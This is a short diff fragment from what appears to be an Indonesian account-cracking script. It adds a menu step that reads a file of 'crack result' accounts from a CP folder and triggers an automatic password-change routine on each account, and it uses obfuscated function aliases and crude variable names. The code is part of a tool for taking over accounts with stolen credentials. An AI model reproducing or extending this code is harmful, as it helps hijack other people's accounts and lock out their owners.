     cik = open('option_.txt','w');cik.write('result');cik.close()
     print('%s [ %sCHECK CRACK RESULT ACCOUNT OPTIONS %s]'%(H,K,H));print('%s '%(O));print('%s [%s•%s] %sEXAMPLE FILE : %s.txt'%(H,P,H,K,tanggal));files__ = _cici_azimvau_('%s [%s•%s] %sFile : '%(H,P,H,K));files = "CP/"+files__
-    try:buka_baju = _MollaVai_dapunta_(files,"r").read().splitlines()
+    try:buka_baju = _azimvau_dapunta_(files,"r").read().splitlines()
     except FileNotFoundError:print("%s [%s!%s] %sFILE NOT EXISTING"%(M,P,M,P));time.sleep(2); menu()
     auto_ganti_pass('Yes');print("%s [%s•%s] %sTOTAL ACCOUNTS : %s%s"%(H,P,H,K,H,str(len(buka_baju))));print("")
     for memek in buka_baju:
